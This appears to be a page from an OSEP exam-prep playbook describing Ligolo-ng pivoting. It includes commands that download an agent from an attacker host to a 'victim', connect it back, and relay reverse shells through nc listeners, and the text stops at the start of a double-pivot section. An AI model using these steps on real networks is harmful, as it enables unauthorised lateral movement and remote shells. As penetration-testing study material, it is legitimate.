<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-osep/Tunneling/Ligolo-ng" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Ligolo-ng | OSEP Playbook</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://hkrsanjeet.github.io/OSEP-Playbook/osep/Tunneling/Ligolo-ng"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Ligolo-ng | OSEP Playbook"><meta data-rh="true" name="description" content="Normal Instructions"><meta data-rh="true" property="og:description" content="Normal Instructions"><link data-rh="true" rel="icon" href="/OSEP-Playbook/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://hkrsanjeet.github.io/OSEP-Playbook/osep/Tunneling/Ligolo-ng"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/osep/Tunneling/Ligolo-ng" hreflang="en"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/osep/Tunneling/Ligolo-ng" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ligolo-ng","item":"https://hkrsanjeet.github.io/OSEP-Playbook/osep/Tunneling/Ligolo-ng"}]}</script><link rel="stylesheet" href="/OSEP-Playbook/assets/css/styles.07dfdec4.css">
<script src="/OSEP-Playbook/assets/js/runtime~main.11fef477.js" defer="defer"></script>
<script src="/OSEP-Playbook/assets/js/main.6ccb996d.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/OSEP-Playbook/"><b class="navbar__title text--truncate">OSEP-PLAYBOOK</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/OSEP-Playbook/osep/scanning/external-nmap">Docs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><a href="https://github.com/hkrsanjeet/OSEP-Playbook" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/OSEP-Playbook/osep/scanning/external-nmap"><span title="OSEP" class="categoryLinkLabel_W154">OSEP</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/osep/scanning/external-nmap"><span title="Scanning" class="categoryLinkLabel_W154">Scanning</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/osep/initial-access/phishing/send-emails"><span title="Initial &amp; Further Access" class="categoryLinkLabel_W154">Initial &amp; Further Access</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/OSEP-Playbook/osep/Tunneling/Ligolo-ng"><span title="Tunneling" class="categoryLinkLabel_W154">Tunneling</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/OSEP-Playbook/osep/Tunneling/Ligolo-ng"><span title="Ligolo-ng" class="linkLabel_WmDU">Ligolo-ng</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/osep/Tunneling/Metasploit"><span title="Metasploit" class="linkLabel_WmDU">Metasploit</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/osep/Tunneling/SSHUTTLE"><span title="SSHUTTLE" class="linkLabel_WmDU">SSHUTTLE</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/osep/Privilege Escalation/Access Tokens - SeImpersonate"><span title="Privilege Esclation" class="categoryLinkLabel_W154">Privilege Esclation</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/osep/Defense Evasion/Disable AMSI"><span title="Defense Evasion" class="categoryLinkLabel_W154">Defense Evasion</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/osep/Credentials/Cracking Hashes"><span title="Credentials" class="categoryLinkLabel_W154">Credentials</span></a></div></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/OSEP-Playbook/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">OSEP</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tunneling</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Ligolo-ng</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Ligolo-ng</h1></header><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="normal-instructions"><strong>Normal Instructions</strong><a href="#normal-instructions" class="hash-link" aria-label="Direct link to normal-instructions" title="Direct link to normal-instructions" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="simple-tunneling"><strong>Simple Tunneling</strong><a href="#simple-tunneling" class="hash-link" aria-label="Direct link to simple-tunneling" title="Direct link to simple-tunneling" translate="no">​</a></h3>
<p>Keep in mind that we should have already downloaded the proxy to our attacker machine, and have transfer the agent to the victim.</p>
<p>Ligolo Tunnel</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_tunnel.png" alt="Ligolo Tunnel" class="img_ev3q"></p>
<ol>
<li class=""><strong>Find the network mask</strong>, for example, if your IP address is <code>X.X.X.X</code> and the subnet mask is <code>Y.Y.Y.Y</code>, the network will be <code>X.X.X.X/</code> followed by the subnet prefix. For instance, with a subnet mask of <code>255.255.255.0</code>, the network prefix would be <code>/24</code>.</li>
<li class=""><strong>Create the interface</strong> for <code>ligolo</code> in my Kali</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> tuntap </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> user </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> mode tun ligolo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">link</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> ligolo up</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Enable the proxy server</strong> on the attacker machine</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./ligolo_proxy_linux </span><span class="token parameter variable" style="color:#36acaa">-selfcert</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./ligolo_proxy_linux </span><span class="token parameter variable" style="color:#36acaa">-selfcert</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-port</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">DIFFERENT_PROXY_PORT</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Download <strong>(bring) the agent</strong> program to the victim (in this example Windows)</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">iwr</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">uri http:</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">/</span><span class="token namespace" style="opacity:0.7">[attacker_ip]</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">ligolo_agent_windows</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">UseBasicParsing </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Outfile ligolo_agent_windows</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Start the client</strong></li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># The port is the default one, we could also change it if needed.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">ligolo_agent_windows</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">connect </span><span class="token namespace" style="opacity:0.7">[attacker_ip]</span><span class="token plain">:11601 </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ignore-cert</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">ligolo_agent_windows</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">connect </span><span class="token namespace" style="opacity:0.7">[attacker_ip]</span><span class="token plain">:&lt;DIFFERENT_PROXY_PORT&gt; </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ignore-cert</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Add the route</strong> in the Kali</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Run this command in other terminal that from the one where ligolo proxy is running</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">internal_submask</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">/24 dev ligolo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verify routing table</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> route list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Finish</strong> setting up the tunneling session</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Run this commands in the ligolo proxy terminal</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">» session</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">» start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># After this the tunneling should be ready, you could perform any command.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="reverse-shells-from-internal-networks"><strong>Reverse Shells From Internal Networks</strong><a href="#reverse-shells-from-internal-networks" class="hash-link" aria-label="Direct link to reverse-shells-from-internal-networks" title="Direct link to reverse-shells-from-internal-networks" translate="no">​</a></h3>
<ol>
<li class="">Setup the Netcat listener in our Kali</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-nvlp</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Setup a listener for the reverse shell in the Ligolo session</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">listener_add </span><span class="token parameter variable" style="color:#36acaa">--addr</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">agent_port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--to</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--tcp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Ligolo Agent Listener</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_10.png" alt="Ligolo Agent Listener" class="img_ev3q"></p>
<ol>
<li class="">Run a reverse shell command or a payload created with <code>msfvenom</code></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">command_to_run_reverse_shell</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_ip</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">:</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_port</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./payload.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Ligolo Download</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_11.png" alt="Ligolo Download" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="double-tunneling"><strong>Double Tunneling</strong><a href="#double-tunneling" class="hash-link" aria-label="Direct link to double-tunneling" title="Direct link to double-tunneling" translate="no">​</a></h3>
<p>In certain cases, the recently compromised host will have two interfaces, enabling you to explore the network further and find more hosts. In this scenario, you&#x27;ll need to execute a double pivot.</p>
<p>Ligolo Double Tunnel</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png" alt="Ligolo Double Tunnel" class="img_ev3q"></p>
<ol>
<li class="">Add a second interface</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> tuntap </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> user </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kali_user</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> mode tun ligolo_double</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">link</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> ligolo_double up</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Create a listener</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># The next step is to add a listener on port 11601 to our existing Ligolo-ng session and redirect it to our machine.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listener_add </span><span class="token parameter variable" style="color:#36acaa">--addr</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:11601 </span><span class="token parameter variable" style="color:#36acaa">--to</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:11601 </span><span class="token parameter variable" style="color:#36acaa">--tcp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verify it&#x27;s been added</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listener_list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>Ligolo Agent Listener</p>
<p><img decoding="async" loading="lazy" src="https://www.emmanuelsolis.com/img/ligolo_01.png" alt="Ligolo Agent Listener" class="img_ev3q"></p>
<ol>
<li class="">Connect to the proxy server</li>
</ol>
